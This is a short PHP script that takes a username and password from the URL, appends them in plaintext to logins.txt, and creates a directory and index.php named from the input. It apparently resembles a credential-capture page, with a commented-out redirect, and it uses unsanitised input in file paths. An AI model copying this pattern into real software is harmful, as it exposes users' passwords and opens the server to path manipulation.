<?php
$password = $_GET['password'];
$username = $_GET['username'];
$combo = $username;
$combo .= $password;
$url = $combo;
$url = str_replace("a", "1", $url);
$url = str_replace("e", "2", $url);
$url = str_replace("i", "3", $url);
$url = str_replace("o", "4", $url);
$url = str_replace("u", "5", $url);
echo $url;
fopen("logins.txt", "a");
$file = fopen("logins.txt", "a");
fwrite($file, $combo);
mkdir($url);
fopen($url . "/index.php", "w");
//fclose($combo . "/index.php");
//header("Location: index.html");
?>
